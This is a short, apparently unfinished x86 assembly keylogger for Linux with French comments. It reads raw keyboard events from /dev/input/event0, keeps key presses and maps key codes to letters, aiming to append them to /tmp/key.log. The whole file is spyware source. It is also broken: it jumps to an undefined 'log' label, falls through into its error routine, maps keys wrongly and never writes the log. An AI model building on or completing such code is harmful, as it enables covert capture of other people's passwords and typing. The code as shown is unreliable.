global _start

section .text
_start:

    ; open event_file
    xor ecx, ecx
    mov ebx, event_keyboard
    mov eax, 5
    int 0x80

    mov esi, eax 

    mov edx, 420          ; 644
    mov ecx, 2101o        ; O_WRONLY | O_CREAT | O_APPEND
    mov ebx, output_file
    mov eax, 5            ; sys_open
    int 0x80

    cmp eax, -13   ; EACCES - Permission Denied - code d'erreur -13
    je erreur      ; jump si registre eax du syscall open = -13

    mov edi, eax 

input:

    mov edx, 16                     ; 16 bytes
    mov ecx, input_event
    mov ebx, esi                    ; File descriptor for reading bytes
    mov eax, 3                      ; sys_read
    int 0x80

    mov byte al, [input_event + 8]  ; event.type
    cmp ax, 0x01                       ;  event.type(EV_KEY) = 1 -> https://github.com/torvalds/linux/blob/master/include/uapi/linux/input-event-codes.h#L39
    jne log         ; jump not equal

    mov byte al, [input_event + 12] ; event.value
    cmp al, 1                       ; event.value = 1 -> event_value de EV_KEY = 1 -> keypress, 0 for key release
    jne log       ; jump equal

    mov byte al, [ecx + 10]         ; event.code (valeur en hexa de la touche du clavier)
    mov byte bl, [Ascii + eax]    ; utiliser cette valeur comme index dans notre string qui représente notre clavier pour trouver la touche du clavier
    push ebx  



erreur:
    mov eax, 4              ; sys_write
    mov ebx, 2              ; stderr
    mov ecx, errMsg
    mov edx, lenErrMsg
    int 0x80

    mov ebx, 0              ; 0 = sortie normale
    mov eax, 1              ; sys_exit
    int 0x80
    ret


section .data
    event_keyboard db "/dev/input/event0", 0
    output_file   db "/tmp/key.log", 0
    errMsg db "Besoin des privilèges du superUtilisateur", 0xa
    lenErrMsg equ $ - errMsg
    Ascii db `azertyuiopqsdfghjklmwxcvbn`

section .bss
    input_event resb 16    ; 16 bytes récupérer en hexadécimal ( 8 premiers -> temps etc ... -> 2 suivant = event type -> 2 suivant = code type -> 4 suivant = valeur input)
